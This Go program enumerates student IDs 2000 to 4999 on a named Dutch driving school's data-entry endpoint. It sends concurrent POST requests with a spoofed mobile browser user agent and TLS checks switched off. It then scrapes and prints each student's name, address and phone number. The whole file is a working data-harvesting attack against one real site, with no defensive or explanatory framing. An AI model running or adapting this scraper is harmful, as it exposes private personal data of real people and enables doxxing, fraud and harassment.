package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)

type student struct {
	name        string
	address     string
	phoneNumber string
}

func main() {
	var wg sync.WaitGroup
	wg.Add(3000)

	for i := 2000; i < 5000; i++ {
		go func(i int) {
			defer wg.Done()

			data := getRawData(i)
			student, err := filterRawData(data)
			if err != nil {
				return
			}

			if !strings.HasPrefix(student.name, "Ahmed Ishtian") {
				fmt.Println(student.name + " " + student.address + " " + student.phoneNumber)
			}
		}(i)
	}

	wg.Wait()

	fmt.Println("COMPLETED")
}

func filterRawData(rawData string) (student student, err error) {

	if len(rawData) == 0 {
		err = errors.New("no data")
		return
	}

	data := strings.Split(rawData, "class='inv_title2'>")

	if len(data) == 1 {
		err = errors.New("invalid studentId")
		return
	}

	data = strings.Split(data[1], "</span>")

	student.name = data[0]

	data = strings.Split(data[1], "<br /><span style='font-size:14px;'>Tel.")

	student.phoneNumber = data[1]

	student.address = strings.ReplaceAll(data[0], "<br />", " ")

	return
}

func getRawData(studentId int) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	params := url.Values{}
	params.Add("leerl", strconv.FormatInt(int64(studentId), 10))
	params.Add("tijd", `2`)
	params.Add("bedrag", ``)
	body := strings.NewReader(params.Encode())

	req, err := http.NewRequest("POST", "http://www.bekedam-rijschool.nl/invoer/invoer/all.html", body)
	if err != nil {
		// handle err
	}
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://www.bekedam-rijschool.nl")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Referer", "http://www.bekedam-rijschool.nl/invoer/invoer/all.html")
	req.Header.Set("Sec-Gpc", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1")

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	buf := new(bytes.Buffer)

	_, err = buf.ReadFrom(resp.Body)

	if err != nil {
		return ""
	}

	return buf.String()
}
